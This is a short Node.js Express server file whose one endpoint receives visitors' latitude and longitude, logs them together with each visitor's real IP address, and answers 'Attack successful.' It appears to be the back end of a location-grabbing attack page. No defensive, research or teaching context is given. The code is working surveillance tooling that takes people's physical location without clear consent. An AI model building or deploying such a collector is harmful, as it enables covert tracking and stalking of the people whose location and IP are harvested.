const express = require("express");
const bodyParser = require("body-parser");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static("public"));

app.set("trust proxy", true)

app.post("/get-location", (req, res) => {
  const { latitude, longitude } = req.body;
  const userIP = req.ip;

    console.log(`GOT LOCATION: IP: ${userIP} Latitude: ${latitude} Longitude: ${longitude}`);
    res.send("Attack successful.");

});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});